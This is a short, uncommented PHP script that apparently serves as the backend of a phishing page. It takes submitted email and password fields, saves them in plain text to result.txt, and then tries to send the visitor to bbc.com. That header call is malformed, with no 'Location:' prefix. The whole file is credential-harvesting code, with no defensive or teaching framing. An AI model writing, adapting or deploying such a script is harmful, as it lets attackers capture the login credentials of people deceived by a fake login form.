<?php

if($_SERVER["REQUEST_METHOD"] == "POST"){
    $file = fopen("result.txt", "w");

    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);
    $break = "\n";

    fwrite($file, $email);
    fwrite($file, $break);
    fwrite($file, $password);
    fclose($file);
    
    header("bbc.com");
}


?>
